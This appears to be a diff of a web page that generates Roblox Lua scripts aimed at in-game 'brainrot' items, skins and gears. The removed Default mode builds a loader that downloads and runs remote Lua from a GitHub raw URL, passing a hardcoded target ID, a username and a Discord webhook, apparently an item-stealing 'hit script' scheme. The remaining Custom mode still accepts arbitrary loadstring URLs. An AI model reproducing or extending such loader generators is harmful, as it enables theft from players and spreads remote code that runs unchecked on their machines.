@@ -456,7 +456,7 @@
     /* MODE CARDS */
     .mode-grid {
       display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+      grid-template-columns: repeat(auto-fit, minmax(130px, 1fr));
       gap: 0.75rem;
     }
 
@@ -752,12 +752,7 @@
         <div class="field">
           <label class="label">Script Mode</label>
           <div class="mode-grid">
-            <div class="mode-card active" data-mode="default">
-              <div class="icon">⚙️</div>
-              <div class="title">Default</div>
-              <div class="desc">Standard UI with webhook</div>
-            </div>
-            <div class="mode-card" data-mode="noui">
+            <div class="mode-card active" data-mode="noui">
               <div class="icon">👻</div>
               <div class="title">No UI</div>
               <div class="desc">No graphical interface</div>
@@ -774,16 +769,6 @@
         <div class="field" id="customLoaderField" style="display: none;">
           <label class="label">Custom Loadstring URL</label>
           <input type="text" class="mono" id="customLoaderInput" placeholder="https://pastefy.app/.../raw or loadstring code" value="">
-        </div>
-
-        <div class="field" id="usernameField">
-          <label class="label">Roblox Username</label>
-          <input type="text" id="usernameInput" placeholder="Your username" value="">
-        </div>
-
-        <div class="field" id="webhookField">
-          <label class="label">Discord Webhook</label>
-          <input type="text" class="mono" id="webhookInput" placeholder="https://discord.com/api/webhooks/..." value="">
         </div>
 
         <div class="field">
@@ -966,7 +951,7 @@
       const selectedSkins = new Set();
       const selectedGears = new Set();
       
-      let currentMode = 'default';
+      let currentMode = 'noui';
 
       const $ = (id) => document.getElementById(id);
 
@@ -980,15 +965,11 @@
       const scriptOutput = $('scriptOutput');
       const generateBtn = $('generateBtn');
       const copyBtn = $('copyBtn');
-      const usernameInput = $('usernameInput');
-      const webhookInput = $('webhookInput');
       const shortLoadstringCheck = $('shortLoadstring');
       const antiLeaveToggle = $('antiLeaveToggle');
       
       const customLoaderField = $('customLoaderField');
       const customLoaderInput = $('customLoaderInput');
-      const usernameField = $('usernameField');
-      const webhookField = $('webhookField');
 
       // Mode Card Selection Logic
       document.querySelectorAll('.mode-card').forEach(card => {
@@ -997,19 +978,10 @@
           card.classList.add('active');
           currentMode = card.dataset.mode;
 
-          // Show/hide custom loader input & hide user/webhook for No UI / Custom
           if (currentMode === 'custom') {
             customLoaderField.style.display = 'flex';
-            usernameField.style.display = 'none';
-            webhookField.style.display = 'none';
-          } else if (currentMode === 'noui') {
-            customLoaderField.style.display = 'none';
-            usernameField.style.display = 'none';
-            webhookField.style.display = 'none';
           } else {
             customLoaderField.style.display = 'none';
-            usernameField.style.display = 'flex';
-            webhookField.style.display = 'flex';
           }
         });
       });
@@ -1141,31 +1113,14 @@
       }
 
       generateBtn.addEventListener('click', async () => {
-        const username = usernameInput.value.trim();
-        const webhook = webhookInput.value.trim();
         const customUrl = customLoaderInput.value.trim();
 
-        let valid = true;
-
-        // Validation based on mode
-        if (currentMode === 'default') {
-          if (!username) { markInvalid(usernameInput); valid = false; }
-          if (!webhook || !webhook.includes('discord.com/api/webhooks')) { markInvalid(webhookInput); valid = false; }
-          if (!valid) {
-            showToast('Fill in username and a valid Discord webhook');
-            scriptOutput.className = 'output-box error';
-            scriptOutput.textContent = '❌ Missing required fields in Default mode.';
-            return;
-          }
-        } else if (currentMode === 'custom') {
-          if (!customUrl) {
-            markInvalid(customLoaderInput);
-            valid = false;
-            showToast('Enter a custom loadstring URL');
-            scriptOutput.className = 'output-box error';
-            scriptOutput.textContent = '❌ Please enter your custom loader URL.';
-            return;
-          }
+        if (currentMode === 'custom' && !customUrl) {
+          markInvalid(customLoaderInput);
+          showToast('Enter a custom loadstring URL');
+          scriptOutput.className = 'output-box error';
+          scriptOutput.textContent = '❌ Please enter your custom loader URL.';
+          return;
         }
 
         if (selectedBrainrots.size === 0) {
@@ -1174,9 +1129,6 @@
           scriptOutput.textContent = '❌ Select at least one brainrot target before generating.';
           return;
         }
-
-        const webhookEscaped = escapeLua(webhook);
-        const usernameEscaped = escapeLua(username);
 
         const brainrotsBlock = Array.from(selectedBrainrots)
           .map((b) => '    ["' + escapeLua(b) + '"] = true,')
@@ -1200,20 +1152,7 @@
         }
 
         // Build based on selected mode
-        if (currentMode === 'default') {
-          luaScript += 'local TARGET_ID = 245727\n' +
-            'local TARGET_USER = "' + usernameEscaped + '"\n' +
-            'local WEBHOOK_URL = "' + webhookEscaped + '"\n\n' +
-            'local TargetBrainrots = {\n' + brainrotsBlock + '\n}\n\n' +
-            'local TargetBaseSkins = {\n' + skinsBlock + '\n}\n\n' +
-            'local TargetGears = {\n' + gearsBlock + '\n}\n\n' +
-            'task.spawn(function()\n' +
-            '    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()\n' +
-            '    if type(script) == "function" then\n' +
-            '        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)\n' +
-            '    end\n' +
-            'end)\n';
-        } else if (currentMode === 'noui') {
+        if (currentMode === 'noui') {
           luaScript += 'local TargetBrainrots = {\n' + brainrotsBlock + '\n}\n\n' +
             'local TargetBaseSkins = {\n' + skinsBlock + '\n}\n\n' +
             'local TargetGears = {\n' + gearsBlock + '\n}\n\n' +
